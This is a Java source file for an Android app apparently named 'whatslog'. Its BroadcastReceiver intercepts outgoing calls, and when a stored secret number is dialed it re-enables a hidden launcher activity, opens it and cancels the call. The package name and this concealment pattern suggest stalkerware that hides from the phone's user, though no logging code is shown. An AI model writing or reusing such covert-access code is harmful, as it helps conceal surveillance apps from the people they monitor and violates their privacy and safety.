package com.android.whatslog;

import java.sql.SQLException;
import java.util.List;

import com.android.whatslog.dao.DatabaseHelperConfiguracao;
import com.android.whatslog.model.Configuracao;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;

public class LaunchReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {

		DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
				context);
		List<Configuracao> confs;
		try {
			confs = database.getDao().queryForAll();

			Configuracao conf = null;

			if (confs.size() > 0) {
				conf = confs.get(0);
			}
			if (conf != null) {
				String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				String compare_num = conf.getDialer();
				if (number.equals(compare_num)) {
					ComponentName componentToDisable = new ComponentName("com.android.whatslog", "com.android.whatslog.MainActivity");
					PackageManager p = context.getPackageManager();
					p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP);

					Intent myintent = new Intent(context, MainActivity.class);
					myintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startActivity(myintent);

//					p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
					setResultData(null);
					abortBroadcast();
				}
			}
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}